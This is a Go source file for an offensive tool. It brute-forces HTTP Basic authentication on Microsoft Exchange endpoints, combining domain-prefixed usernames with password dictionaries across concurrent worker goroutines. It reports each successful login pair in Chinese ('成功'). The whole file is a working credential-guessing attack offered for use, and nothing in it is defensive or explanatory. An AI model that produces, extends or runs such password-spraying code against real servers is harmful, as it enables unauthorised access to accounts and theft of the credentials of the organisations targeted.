package lib

import (
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"net/url"
	"sync"
	"time"
)

func BasicBruteWorker(u string, domain string, task chan []string) {

	for data := range task {
		username, password := data[0], data[1]
		req, _ := http.NewRequest("GET", u, nil)
		req.SetBasicAuth(domain+"\\"+username, password)
		req.Header.Add("Connection", "close")
		res, _ := Client.Do(req)
		if res.StatusCode != 401 && res.StatusCode != 408 && res.StatusCode != 504 {
			color.Green("[+] 成功 %v", username+":"+password)
		} else {
			//color.Red("[-] 失败 %v", username+":"+password)
		}
	}
}

func BasicBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int) {

	authPath := ExchangeUrls[mode]
	u, _ := url.JoinPath(targetUrl, authPath)
	fmt.Println("[*] 使用", mode, "接口爆破", targetUrl)

	task := make(chan []string, len(userDict)*len(passDict))

	t1 := time.Now()

	for _, username := range userDict {
		for _, password := range passDict {
			data := []string{username, password}
			task <- data
		}
	}
	close(task)

	var wg sync.WaitGroup

	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			BasicBruteWorker(u, domain, task)
		}()
	}

	wg.Wait()

	t2 := time.Now()
	fmt.Println("[*] 耗时", t2.Sub(t1))
}
